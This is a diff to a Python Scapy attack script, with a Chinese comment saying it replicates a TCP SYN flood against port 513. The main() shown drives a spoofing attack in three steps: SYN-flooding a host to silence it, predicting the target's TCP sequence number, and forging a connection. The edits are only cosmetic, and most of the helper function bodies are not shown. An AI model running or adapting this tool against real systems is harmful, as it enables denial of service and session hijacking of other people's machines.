@@ -2,7 +2,7 @@
 # @Author: lock
 # @Date:   2016-11-20 23:43:09
 # @Last Modified by:   lock
-# @Last Modified time: 2016-11-20 23:58:04
+# @Last Modified time: 2016-11-21 10:34:32
 # coding=UTF-8
 
 #用 Scapy 简单的复制一个 TCP SYN 洪水攻击，将制作一些 IP 数据包,  TCP 513 目标端口。
@@ -46,7 +46,7 @@ def spoofConn(src, tgt, ack):
 	send(ackPkt)
 
 def main():
-	parser = optparse.OptionParser('usage%prog -s<src for SYNFlood> -S <src for spoofed connection> -t<target address>')
+	parser = optparse.OptionParser('usage %prog -s<src for SYNFlood> -S <src for spoofed connection> -t<target address>')
 	parser.add_option('-s', dest='synSpoof', type='string', help='specifc src for SYN Flood')
 	parser.add_option('-S', dest='srcSpoof', type='string', help='specify src for spoofed connection')
 	parser.add_option('-t', dest='tgt', type='string', help='specify target address')
@@ -58,8 +58,10 @@ def main():
 		synSpoof = options.synSpoof 
 		srcSpoof = options.srcSpoof 
 		tgt = options.tgt
-	print('[+] Starting SYN Flood to suppress remote server.') synFlood(synSpoof, srcSpoof)
-	print('[+] Calculating correct TCP Sequence Number.') seqNum = calTSN(tgt) + 1
+	print('[+] Starting SYN Flood to suppress remote server.') 
+	synFlood(synSpoof, srcSpoof)
+	print('[+] Calculating correct TCP Sequence Number.') 
+	seqNum = calTSN(tgt) + 1
 	print('[+] Spoofing Connection.') 
 	spoofConn(srcSpoof, tgt, seqNum) 
 	print('[+] Done.')
